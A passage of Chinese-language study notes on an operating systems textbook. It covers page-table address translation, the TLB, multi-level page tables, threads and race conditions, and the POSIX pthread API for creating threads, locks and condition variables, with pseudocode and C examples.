class="hljs-attr">PTEAddr</span> = PageTableBaseRegister + (VPN * sizeof(PTE))<br></code></pre></td></tr></table></figure><p>在我们的例子中，VPN MASK 将被设置为 0x30（十六进制 30，或二进制 110000），它 从完整的虚拟地址中挑选出 VPN 位；SHIFT 设置为 4（偏移量的位数），这样我们就可以将 VPN 位向右移动以形成正确的整数虚拟页码。例如，使用虚拟地址 21（010101），掩码将 此值转换为 010000，移位将它变成 01，或虚拟页 1，正是我们期望的值。然后，我们使用 该值作为页表基址寄存器指向的 PTE 数组的索引。</p><p>一旦知道了这个物理地址，硬件就可以从内存中获取 PTE，提取 PFN，并将它与来自 虚拟地址的偏移量连接起来，形成所需的物理地址。具体来说，你可以想象 PFN 被 SHIFT 左移，然后与偏移量进行逻辑或运算，以形成最终地址</p><figure class="highlight ini"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs ini"><span class="hljs-attr">offset</span> = VirtualAddress &amp; <span class="hljs-literal">OFF</span>SET_MASK<br><span class="hljs-attr">PhysAddr</span> = (PFN &lt;&lt; SHIFT) | <span class="hljs-literal">off</span>set <br></code></pre></td></tr></table></figure><figure class="highlight basic"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><code class="hljs basic"><span class="hljs-symbol">1 </span>// Extract the VPN from the virtual address<br><span class="hljs-symbol">2 </span>VPN = (VirtualAddress &amp; VPN_MASK) &gt;&gt; SHIFT<br><span class="hljs-number">3</span><br><span class="hljs-symbol">4 </span>// Form the address of the page-table entry (PTE)<br><span class="hljs-symbol">5 </span>PTEAddr = PTBR + (VPN * sizeof(PTE))<br><span class="hljs-number">6</span><br><span class="hljs-symbol">7 </span>// Fetch the PTE<br><span class="hljs-symbol">8 </span>PTE = AccessMemory(PTEAddr)<br><span class="hljs-number">9</span><br><span class="hljs-symbol">10 </span>// Check <span class="hljs-keyword">if</span> process can access the page<br><span class="hljs-symbol">11 </span><span class="hljs-keyword">if</span> (PTE.Valid == False)<br><span class="hljs-symbol">12 </span>RaiseException(SEGMENTATION_FAULT)<br><span class="hljs-symbol">13 </span><span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span> (CanAccess(PTE.ProtectBits) == False)<br><span class="hljs-symbol">14 </span>RaiseException(PROTECTION_FAULT)<br><span class="hljs-symbol">15 </span><span class="hljs-keyword">else</span><br><span class="hljs-symbol">16 </span>// Access is OK: form physical address <span class="hljs-keyword">and</span> fetch it<br><span class="hljs-symbol">17 </span>offset = VirtualAddress &amp; OFFSET_MASK<br><span class="hljs-symbol">18 </span>PhysAddr = (PTE.PFN &lt;&lt; PFN_SHIFT) | offset<br><span class="hljs-symbol">19 </span>Register = AccessMemory(PhysAddr) <br></code></pre></td></tr></table></figure><p>对于每个内存引用（无论是取指令还是显式加载或存储），分页都需要我们执行一个 额外的内存引用，以便首先从页表中获取地址转换。工作量很大！额外的内存引用开销很 大，在这种情况下，可能会使进程减慢两倍或更多。</p><h2 id="内存追踪"><a href="#内存追踪" class="headerlink" title="内存追踪"></a>内存追踪</h2><p>略（就是小结）</p><h1 id="第-19-章-分页：快速地址转换（TLB）"><a href="#第-19-章-分页：快速地址转换（TLB）" class="headerlink" title="第 19 章 分页：快速地址转换（TLB）"></a>第 19 章 分页：快速地址转换（TLB）</h1><p>虚拟地址转换的<strong>映射信息</strong>，往往储存在<strong>物理内存</strong>中，故转换虚拟地址时，分页逻辑上需要额外一次的内存访问。这个会带来较高的性能开销。</p><p>于是我们需要思考，如何<strong>加速</strong>地址转换。</p><p><strong>TLB（translation-lookaside buffer， TLB）</strong>，即<strong>地址转换旁路缓冲储存器</strong>。</p><p>它就是频繁发生的虚拟到物理地址转换的<strong>硬件缓存（cache）</strong>。</p><p>对每次内存访问，硬件先检查 TLB，看看其中是否有期望的转换映射，如果有，就完成转换（很快），不用访问页表（其中有全部的转换映射）。</p><h2 id="TLB-的基本算法"><a href="#TLB-的基本算法" class="headerlink" title="TLB 的基本算法"></a>TLB 的基本算法</h2><figure class="highlight basic"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><code class="hljs basic"><span class="hljs-symbol">1 </span> VPN = (VirtualAddress &amp; VPN_MASK) &gt;&gt; SHIFT<br><span class="hljs-symbol">2 </span>(Success, TlbEntry) = TLB_Lookup(VPN)<br><span class="hljs-symbol">3 </span><span class="hljs-keyword">if</span> (Success == True) // TLB Hit<br><span class="hljs-symbol">4 </span>    <span class="hljs-keyword">if</span> (CanAccess(TlbEntry.ProtectBits) == True)<br><span class="hljs-symbol">5 </span>        Offset = VirtualAddress &amp; OFFSET_MASK<br><span class="hljs-symbol">6 </span>        PhysAddr = (TlbEntry.PFN &lt;&lt; SHIFT) | Offset<br><span class="hljs-symbol">7 </span>        AccessMemory(PhysAddr)<br><span class="hljs-symbol">8 </span>    <span class="hljs-keyword">else</span><br><span class="hljs-symbol">9 </span>        RaiseException(PROTECTION_FAULT)<br><span class="hljs-symbol">10 </span><span class="hljs-keyword">else</span> // TLB Miss<br><span class="hljs-symbol">11 </span>    PTEAddr = PTBR + (VPN * sizeof(PTE))<br><span class="hljs-symbol">12 </span>    PTE = AccessMemory(PTEAddr) <br><span class="hljs-symbol">13 </span>    <span class="hljs-keyword">if</span> (PTE.Valid == False)<br><span class="hljs-symbol">14 </span>        RaiseException(SEGMENTATION_FAULT)<br><span class="hljs-symbol">15 </span>    <span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span> (CanAccess(PTE.ProtectBits) == False)<br><span class="hljs-symbol">16 </span>        RaiseException(PROTECTION_FAULT)<br><span class="hljs-symbol">17 </span>    <span class="hljs-keyword">else</span><br><span class="hljs-symbol">18 </span>        TLB_Insert(VPN, PTE.PFN, PTE.ProtectBits)<br><span class="hljs-symbol">19 </span>        RetryInstruction() <br></code></pre></td></tr></table></figure><p>硬件算法的大体流程如下：</p><ul><li>首先从虚拟地址中提取页号（VPN）（见图 19.1 第 1 行）， 然后检查 TLB 是否有该 VPN 的转换映射（第 2 行）。如果有，我们有了 TLB 命中（TLB hit）， 这意味着 TLB 有该页的转换映射。成功！</li><li>接下来我们就可以从相关的 TLB 项中取出页帧号（PFN），与原来虚拟地址中的偏移量组合形成期望的物理地址（PA），并访问内存（第 5～7 行），假定保护检查没有失败（第 4 行）。</li><li>如果 CPU 没有在 TLB 中找到转换映射（TLB 未命中），我们有一些工作要做。在本例中，硬件访问页表来寻找转换映射（第 11～12 行），并用该转换映射更新 TLB（第 18 行）， 假设该虚拟地址有效，而且我们有相关的访问权限（第 13、15 行）。上述系列操作开销较大，主要是因为访问页表需要额外的内存引用（第 12 行）。最后，当 TLB 更新成功后，系统会重新尝试该指令，这时 TLB 中有了这个转换映射，内存引用得到很快处理。</li></ul><p><strong>尽可能利用缓存</strong>：缓存是计算机系统在最基本的性能改进技术之一，一次又一次地用于<strong>让常见的情况更快</strong>。</p><p>其背后的思想是利用指令和数据引用的局部性（如数组的密集存放，往往不命中的只有开头的那一个，随后几个便会命中）</p><p><strong>时间局部性</strong>：最近访问过的指令或数据项可能很快会再次访问。想想循环中的循环变量或指令，它们被多次反复访问。</p><p><strong>空间局部性</strong>：当程序访问内存地址 x 时，可能很快会访问邻近 x 的内存。想想遍历某种数组，访问一个接一个的元素。当然，这些性质取决于程序的特点，并不是绝对的定律，而更像是一种经验法则。</p><h2 id="谁来处理-TLB-未命中"><a href="#谁来处理-TLB-未命中" class="headerlink" title="谁来处理 TLB 未命中"></a>谁来处理 TLB 未命中</h2><p><strong>是硬件</strong></p><p>为了做到这一点，硬件必须知道页表在内存中的确切位置，以及页表的确切格式。发生未命中时，硬件会“遍历”页表，找到正确的页表项，取出想要的转换映射，用它更新 TLB，并重试该指令。这种“旧”体系结构有硬件管理的 TLB，一个例子是 x86 架构，它采用固定的<strong>多级页表（multi-level page table）</strong>。</p><p>更现代的体系结构（例如，MIPS；Sun 公司的 SPARC，都是RISC），有所谓的<strong>软件管理 TLB（software-managed TLB）</strong>，发生 TLB 未命中时，硬件系统会抛出一个异常，这会暂停当前的指令流，将特权级提升至内核模式，跳转至陷阱处理程序（trap handler）。接下来，这个陷阱处理程序是操作系统的一段代码，用于处理 TLB 未命中。</p><p>这段代码在运行时，会查找页表中的转换映射，然后用特别的“特权”指令更新 TLB，并从陷阱返回。此时，硬件会重试该指令（导致 TLB 命中）。</p><h2 id="几个重要的细节"><a href="#几个重要的细节" class="headerlink" title="几个重要的细节"></a>几个重要的细节</h2><ul><li><p>首先，这里的从陷阱返回指令稍稍不同于之前提到的服务于系统调用的从陷阱返回。在后一种情况下，从陷阱返回应该继续执行陷入操作系统之后那条指令，就像从函数调用返回后，会继续执行此次调用之后的语句。</p></li><li><p>在前一种情况下，在从 TLB 未命中的陷阱返回后，<strong>硬件必须从导致陷阱的指令继续执行</strong> 。这次重试因此导致该指令再次执行，但这次会命中 TLB。因此，根据陷阱或异常的原因，系统在陷入内核时，必须保存不同的程序计数器，以便将来能够正确地继续执行。</p></li><li><p>第二，在运行 TLB 未命中处理代码时，操作系统需要格外小心避免引起 TLB 未命中的<strong>无限递归</strong>。有很多解决方案，例如，可以把 TLB 未命中陷阱处理程序直接放到物理内存中[它们没有映射过（unmapped），不用经过地址转换]</p></li><li><p>或者在 TLB 中保留一些项，记录永久有效的地址转换，并将其中一些永久地址转换槽块留给处理代码本身，这些被监听的（wired） 地址转换总是会命中 TLB。</p></li></ul><h2 id="TLB-的内容"><a href="#TLB-的内容" class="headerlink" title="TLB 的内容"></a>TLB 的内容</h2><p>我们来详细看一下硬件 TLB 中的内容。典型的 TLB 有 32 项、64 项或 128 项，并且是 <strong>全相联的（fully associative）</strong>。基本上，这就意味着一条地址映射可能存在 TLB 中的任意位置，硬件会并行地查找 TLB，找到期望的转换映射。</p><p>一条 TLB 项内容可能像下面这样：</p><p>VPN ｜ PFN ｜ 其他位</p><p>注意，VPN 和 PFN 同时存在于 TLB 中，因为一条地址映射可能出现在任意位置（用硬件的术语，TLB 被称为全相联的（fully-associative）缓存）。</p><p>注意：</p><ul><li>TLB 的有效位，只是指出 TLB 项是不是有效的地址映射。</li><li>页表的有效位，表示该页有没有被进程申请使用。</li></ul><p>更有趣的是“其他位”。例如，TLB 通常有一个<strong>有效（valid）位</strong>，用来标识该项是不是有效地转换映射。通常还有一些<strong>保护（protection）位</strong>，用来标识该页是否有访问权限。例如，代码页被标识为可读和可执行，而堆的页被标识为可读和可写。还有其他一些位，包括<strong>地址空间标识符（address-space identifier）</strong>、<strong>脏位（dirty bit）</strong>等。下面会介绍更多信息。</p><h2 id="上下文切换时对-TLB-的处理"><a href="#上下文切换时对-TLB-的处理" class="headerlink" title="上下文切换时对 TLB 的处理"></a>上下文切换时对 TLB 的处理</h2><p>有了 TLB，在进程间切换时（因此有地址空间切换），会面临一些新问题。具体来说， TLB 中包含的虚拟到物理的地址映射只对当前进程有效，对其他进程是没有意义的。所以在发生进程切换时，硬件或操作系统（或二者）必须注意确保即将运行的进程不要<strong>误读</strong>了之前进程的地址映射。</p><ul><li>一种方法是在上下文切换时，简单地<strong>清空（flush）</strong>TLB，这样在新进程运行前 TLB 就变成了空的。如果是<strong>软件管理 TLB</strong> 的系统，可以在发生上下文切换时，通过一条显式（特权）指令来完成。如果是<strong>硬件管理 TLB</strong>，则可以在页表基址寄存器内容发生变化时清空 TLB（注意，在上下文切换时，操作系统必须改变页表基址寄存器（PTBR） 的值）。不论哪种情况，清空操作都是把<strong>全部有效位（valid）置为 0</strong>，本质上清空了 TLB。</li><li>为了减少每次清空以后，之后多次不命中的开销，一些系统增加了硬件支持，实现跨上下文切换的 TLB 共享。比如 有的系统在 TLB 中添加了一个<strong>地址空间标识符（Address Space Identifier，ASID）</strong>。</li><li>可以把 ASID 看作是<strong>进程标识符（Process Identifier，PID）</strong>，但通常比 PID 位数少（PID 一般 32 位， ASID 一般是 8 位）。</li></ul><h2 id="TLB-替换策略"><a href="#TLB-替换策略" class="headerlink" title="TLB 替换策略"></a>TLB 替换策略</h2><p>TLB 和其他缓存一样，还有一个问题要考虑，即<strong>缓存替换（cache replacement）</strong>。具体来说，向 TLB 中插入新项时，会<strong>替换（replace）</strong>一个旧项，这样问题就来了：应该替换那一个？</p><ul><li>替换<strong>最近最少使用（least-recently-used，LRU）</strong>的项；</li><li><strong>随机（random）</strong>策略，即随机选择一项换出去。</li></ul><h2 id="实际系统的-TLB-表项"><a href="#实际系统的-TLB-表项" class="headerlink" title="实际系统的 TLB 表项"></a>实际系统的 TLB 表项</h2><p><img src="/2023/03/23/Operating-Systems/p17.png"></p><ul><li>VPN：虚拟页号；</li><li>G：全局位（Global，G），用来指示这个页是不是所有进程全局共享的；</li><li>ASID：地址空间标识符；</li><li>PFN：物理帧号；</li><li>C：一致性位（Coherence，C），决定硬件如何缓存该页；</li><li>D：脏位，表示该页是否被写入新数据；</li><li>V：有效位，告诉硬件该项的地址映射是否有效。</li></ul><h1 id="第-20-章-分页：较小的表"><a href="#第-20-章-分页：较小的表" class="headerlink" title="第 20 章 分页：较小的表"></a>第 20 章 分页：较小的表</h1><h2 id="多级页表"><a href="#多级页表" class="headerlink" title="多级页表"></a>多级页表</h2><p><strong>多级页表（multi-level pagetable）</strong></p><p>多级页表的基本思想很简单。首先，将页表分成页大小的单元。然后，如果整页的页表项（PTE）无效，就完全不分配该页的页表。为了追踪页表的页是否有效（以及如果有效，它在内存中的位置），使用了名为页目录（page directory）的新结构。页目录因此可以告诉你页表的页在哪里，或者页表的整个页不包含有效页。</p><p>例子如下：</p><p><img src="/2023/03/23/Operating-Systems/p18.png"></p><p>可见，左边的线性页表，多分配了两个空白的页，而右边的多级页表，其中两个完全无数据的空白页并未被分配。</p><p>应该指出，多级页表是有成本的。在 TLB 未命中时，需要从内存加载<strong>两次</strong>，才能从页表中获取正确的地址转换信息（一次用于页目录，另一次用于 PTE 本身）。</p><p>因此，多级表是一个<strong>时间—空间折中（time-space trade-off）</strong>的小例子。</p><p>另一个明显的缺点是<strong>复杂性</strong>。无论是硬件还是操作系统来处理页表查找（在 TLB 未命中时），这样做无疑都比简单的线性页表查找更复杂。</p><h2 id="多级页表例子"><a href="#多级页表例子" class="headerlink" title="多级页表例子"></a>多级页表例子</h2><p>如图，这是一个页目录（左边大竖列）以及页表（右边两大竖列）</p><p><img src="/2023/03/23/Operating-Systems/p19.png"></p><p>最后，让我们用这些信息来进行地址转换。这里是一个地址，指向 VPN 254 的第 0 个字节：0x3F80，或二进制的 11 1111 1000 0000。</p><p>回想一下，我们将使用 VPN 的前 4 位来索引页目录。因此，1111 会从上面的页目录中选择最后一个（第 15 个，如果你从第 0 个开始）。</p><ul><li>这就指向了位于地址 101 的页表的有效页。</li><li>然后，我们使用 VPN 的下 4 位（1110）来索引页表的那一页并找到所需的 PTE。1110 是页面中的倒数第二（第 14 个）条，并告诉我们虚拟地址空间的页 254 映射到物理页 55。</li><li>通过连接 PFN = 55（或十六进制 0x37）和 offset = 000000，可以形成我们想要的物理地址，并向内存系统发出请求：PhysAddr =（PTE.PFN &lt;&lt; SHIFT）+ offset = 00 1101 1100 0000 = 0x0DC0</li></ul><h1 id="第-26-章-并发：介绍"><a href="#第-26-章-并发：介绍" class="headerlink" title="第 26 章 并发：介绍"></a>第 26 章 并发：介绍</h1><p>单个线程的状态与进程状态非常类似。线程有一个程序计数器（PC），记录程序从哪里获取指令。每个线程有自己的一组用于计算的寄存器。所以，如果有两个线程运行在一个处理器上，从运行一个线程（T1）切换到另一个线程（T2）时，必定发生上下文切换（context switch）。线程之间的上下文切换类似于进程间的上下文切换。对于进程，我们将状态保存到进程控制块（Process Control Block，PCB）。现在，我们需要一个或多个线程控制块（Thread Control Block，TCB），保存每个线程的状态。但是，与进程相比，线程之间的上下文切换有一点主要区别：<strong>地址空间保持不变</strong>（即不需要切换当前使用的页表）。</p><p><img src="/2023/03/23/Operating-Systems/p20.png"></p><p>如图，线程也会让内存空间中出现多个栈。</p><h2 id="线程创建"><a href="#线程创建" class="headerlink" title="线程创建"></a>线程创建</h2><p>这是一个简单线程创建代码</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-number">1</span> <span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdio.h&gt;</span></span><br><span class="hljs-number">2</span> <span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;assert.h&gt;</span></span><br><span class="hljs-number">3</span> <span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;pthread.h&gt;</span></span><br><span class="hljs-number">4</span><br><span class="hljs-number">5</span> <span class="hljs-type">void</span> *<span class="hljs-title function_">mythread</span><span class="hljs-params">(<span class="hljs-type">void</span> *arg)</span> &#123;<br><span class="hljs-number">6</span> <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;%s\n&quot;</span>, (<span class="hljs-type">char</span> *) arg);<br><span class="hljs-number">7</span> <span class="hljs-keyword">return</span> <span class="hljs-literal">NULL</span>;<br><span class="hljs-number">8</span> &#125;<br><span class="hljs-number">9</span><br><span class="hljs-number">10</span> <span class="hljs-type">int</span><br><span class="hljs-number">11</span> main(<span class="hljs-type">int</span> argc, <span class="hljs-type">char</span> *argv[]) &#123;<br><span class="hljs-number">12</span> <span class="hljs-type">pthread_t</span> p1, p2;<br><span class="hljs-number">13</span> <span class="hljs-type">int</span> rc;<br><span class="hljs-number">14</span> <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;main: begin\n&quot;</span>);<br><span class="hljs-number">15</span> rc = pthread_create(&amp;p1, <span class="hljs-literal">NULL</span>, mythread, <span class="hljs-string">&quot;A&quot;</span>); assert(rc == <span class="hljs-number">0</span>);<br><span class="hljs-number">16</span> rc = pthread_create(&amp;p2, <span class="hljs-literal">NULL</span>, mythread, <span class="hljs-string">&quot;B&quot;</span>); assert(rc == <span class="hljs-number">0</span>);<br><span class="hljs-number">17</span> <span class="hljs-comment">// join waits for the threads to finish</span><br><span class="hljs-number">18</span> rc = pthread_join(p1, <span class="hljs-literal">NULL</span>); assert(rc == <span class="hljs-number">0</span>);<br><span class="hljs-number">19</span> rc = pthread_join(p2, <span class="hljs-literal">NULL</span>); assert(rc == <span class="hljs-number">0</span>);<br><span class="hljs-number">20</span> <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;main: end\n&quot;</span>);<br><span class="hljs-number">21</span> <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br><span class="hljs-number">22</span> &#125; <br></code></pre></td></tr></table></figure><p>关于其中的 p1 p2 线程，其打印的顺序是不确定的。</p><h2 id="竞态条件"><a href="#竞态条件" class="headerlink" title="竞态条件"></a>竞态条件</h2><p><strong>竞态条件（race condition）</strong></p><p>例如：两个线程都想让一个全局变量 count + 1；但两者执行到写入寄存器后，没来得及写入内存，就调用了另一个线程。</p><p>会导致最终程序达不到想要的效果。</p><h1 id="第-27-章-插叙：线程API"><a href="#第-27-章-插叙：线程API" class="headerlink" title="第 27 章 插叙：线程API"></a>第 27 章 插叙：线程API</h1><p>关于如何使用线程的API</p><h2 id="线程创建-1"><a href="#线程创建-1" class="headerlink" title="线程创建"></a>线程创建</h2><figure class="highlight delphi"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs delphi">pthread_create( pthread_t * thread,<br> <span class="hljs-keyword">const</span> pthread_attr_t * attr,<br> void * <span class="hljs-comment">(*start_routine)(void*)</span>,<br> void * arg); <br></code></pre></td></tr></table></figure><ul><li>第一个参数 thread 是指向 pthread_t 结构体的指针；</li><li>第二个参数 attr 用于指定该线程可能具有的任何属性。包括设置栈大小，或关于该线程调度优先级的信息。</li><li>第三个参数，指这个线程应该在哪个函数中运行。这是一个函数指针（function pointer），这个指针告诉我们需要以下内容，一个函数名称（start_routine），它被传入一个类型为 void *的参数（start_routine 后面的括号表明了这一点），并且它返回一个 void *类型的值（即一个 void 指针）。</li><li>第四个参数 arg 是要传递给线程开始执行的函数的参数。</li></ul><p>为什么我们需要这些 void 指针？好吧，答案很简单：将 void 指针作为函数的参数 start_routine，允许我们传入任何类型的参数，将它作为返回值，允许线程返回任何类型的结果。</p><h2 id="线程完成"><a href="#线程完成" class="headerlink" title="线程完成"></a>线程完成</h2><p>具体来说，你必须调用函数 pthread_join()；</p><p>该函数有两个参数。第一个是 pthread_t 类型，用于指定要等待的线程。这个变量是由线程创建函数初始化的（当你将一个指针作为参数传递给 pthread_create()时）。如果你保留了它，就可以用它来等待该线程终止。</p><p>第二个参数是一个指针，指向你希望得到的返回值。因为函数可以返回任何东西，所以它被定义为返回一个指向 void 的指针。因为 pthread_join()函数改变了传入参数的值，所以你需要传入一个指向该值的指针，而不只是该值本身。</p><h2 id="锁"><a href="#锁" class="headerlink" title="锁"></a>锁</h2><p>除了线程创建和 join 之外，POSIX 线程库提供的最有用的函数集，可能是通过锁（lock）来提供互斥进入临界区的那些函数。这方面最基本的一对函数是：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-type">int</span> <span class="hljs-title function_">pthread_mutex_lock</span><span class="hljs-params">(<span class="hljs-type">pthread_mutex_t</span> *mutex)</span>;<br><span class="hljs-type">int</span> <span class="hljs-title function_">pthread_mutex_unlock</span><span class="hljs-params">(<span class="hljs-type">pthread_mutex_t</span> *mutex)</span>;<br></code></pre></td></tr></table></figure><h3 id="锁的初始化"><a href="#锁的初始化" class="headerlink" title="锁的初始化"></a>锁的初始化</h3><p>一种方法是使用 PTHREAD_MUTEX_ INITIALIZER</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-type">pthread_mutex_t</span> lock = PTHREAD_MUTEX_INITIALIZER;<br></code></pre></td></tr></table></figure><p>这样做会将锁设置为默认值，从而使锁可用。</p><p>初始化的动态方法（即在运行时）是调用 pthread_mutex_init()，如下所示:</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-type">int</span> rc = pthread_mutex_init(&amp;lock, <span class="hljs-literal">NULL</span>);<br>assert(rc == <span class="hljs-number">0</span>); <span class="hljs-comment">// always check success! </span><br></code></pre></td></tr></table></figure><p>此函数的第一个参数是锁本身的地址，而第二个参数是一组可选属性。</p><p>传入 NULL 就是使用默认值。</p><p>请注注，当你用完锁时，还应该相应地调用<code> pthread_mutex_destroy()</code></p><p>上述代码的第二个问题是在调用获取锁和释放锁时没有检查错误代码。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-type">void</span> <span class="hljs-title function_">Pthread_mutex_lock</span><span class="hljs-params">(<span class="hljs-type">pthread_mutex_t</span> *mutex)</span> &#123;<br> <span class="hljs-type">int</span> rc = pthread_mutex_lock(mutex);<br> assert(rc == <span class="hljs-number">0</span>);<br>&#125; <br></code></pre></td></tr></table></figure><h2 id="条件变量"><a href="#条件变量" class="headerlink" title="条件变量"></a>条件变量</h2><p>所有线程库还有一个主要组件，就是存在一个<strong>条件变量（condition variable）</strong></p><p>当线程之间必须发生某种信号时，如果一个线程在等待另一个线程继续执行某些操作，条件变量就很有用。</p><p>希望以这种方式进行交互的程序使用两个主要函数：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-type">int</span> <span class="hljs-title function_">pthread_cond_wait</span><span class="hljs-params">(<span class="hljs-type">pthread_cond_t</span> *cond, <span class="hljs-type">pthread_mutex_t</span> *mutex)</span>;<br><span class="hljs-type">int</span> <span class="hljs-title function_">pthread_cond_signal</span><span class="hljs-params">(<span class="hljs-type">pthread_cond_t</span> *cond)</span>; <br></code></pre></td></tr></table></figure><p>要使用条件变量，必须另外有一个与此条件相关的锁。在调用上述任何一个函数时，应该持有这个锁。</p><p>第一个函数 pthread_cond_wait()使调用线程进入休眠状态，因此等待其他线程发出信号，通常当程序中的某些内容发生变化时，现在正在休眠的线程可能会关心它。典型的用法如下所示：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-type">pthread_mutex_t</span> lock = PTHREAD_MUTEX_INITIALIZER;<br><span class="hljs-type">pthread_cond_t</span> cond = PTHREAD_COND_INITIALIZER;<br>Pthread_mutex_lock(&amp;lock);<br><span class="hljs-keyword">while</span> (ready == <span class="hljs-number">0</span>)<br> Pthread_cond_wait(&amp;cond, &amp;lock);<br>Pthread_mutex_unlock(&amp;lock); <br></code></pre></td></tr></table></figure><p>在这段代码中，在初始化相关的锁和条件之后，一个线程检查变量 ready 是否已经被设置 为零以外的值。如果没有，那么线程只是简单地调用等待函数以便休眠，直到其他线程唤醒它。</p><p>唤醒线程的代码运行在另外某个线程中，像下面这样：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs c">Pthread_mutex_lock(&amp;lock);<br>ready = <span class="hljs-number">1</span>;<br>Pthread_cond_signal(&amp;cond);<br>Pthread_mutex_unlock(&amp;lock); <br></code></pre></td></tr></table></figure><p>最后一点需要注注：<strong>等待线程在 while 循环中重新检查条件，而不是简单的 if 语句</strong>。</p><h1 id="第-28-章-锁"><a href="#第-28-章-锁" class="headerlink" title="第 28 章 锁"></a>第 28 章 锁</h1><h2 id="锁的基本思想"><a href="#锁的基本思想" class="headerlink" title="锁的基本思想"></a>锁的基本思想</h2><p>举个例子，假设临界区像这样，典型的更新共享变量：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs c">balance = balance + <span class="hljs-number">1</span>;<br></code></pre></td></tr></table></figure><p>当然，其他临界区也是可能的，比如为链表增加一个元素，或对共享结构的复杂更新 操作。为了使用锁，我们给临界区增加了这样一些代码：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-type">lock_t</span> mutex; <span class="hljs-comment">// some globally-allocated lock &#x27;mutex&#x27;</span><br>...<br>lock(&amp;mutex);<br>balance = balance + <span class="hljs-number">1</span>;<br>unlock(&amp;mutex); <br></code></pre></td></tr></table></figure><p>锁就是一个变量，因此我们需要声明一个某种类型的<strong>锁变量（lock variable，如上面的 mutex）</strong>，才能使用。这个<strong>锁变量（简称锁）</strong>保存了锁在某一时刻的状态。它要么是<strong>可用的</strong> （available，或 unlocked，或 free），表示没有线程持有锁，要么是<strong>被占用的</strong>（acquired，或 locked， 或 held），表示有一个线程持有锁，正处于临界区。</p><ul><li><p>使用<code>lock()</code>尝试获取锁，进入临界区。</p></li><li><p>如果另外一个线程对相同的锁变量（本例中的 mutex）调用 lock()，因为锁被另一线程持有， 该调用不会返回。这样，当持有锁的线程在临界区时，其他线程就<strong>无法</strong>进入临界区。</p></li><li><p>锁的持有者一旦调用**unlock()**，锁就变成可用了。如果没有其他等待线程（即没有其他 线程调用过 lock()并卡在那里），锁的状态就变成可用了。</p></li></ul><h2 id="Pthread-锁"><a href="#Pthread-锁" class="headerlink" title="Pthread 锁"></a>Pthread 锁</h2><p>POSIX 库将锁称为<strong>互斥量（mutex）</strong>，因为它被用来提供线程之间的互斥。即当一个线程在临界区，它能够阻止其他线程进入直到本线程离开临界区。因此，如果你看到下面的 POSIX 线程代码，应该理解它和上面的代码段执行相同的任务（我们再次使用了包装函数来检查获取锁和释放锁时的错误）。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-type">pthread_mutex_t</span> lock = 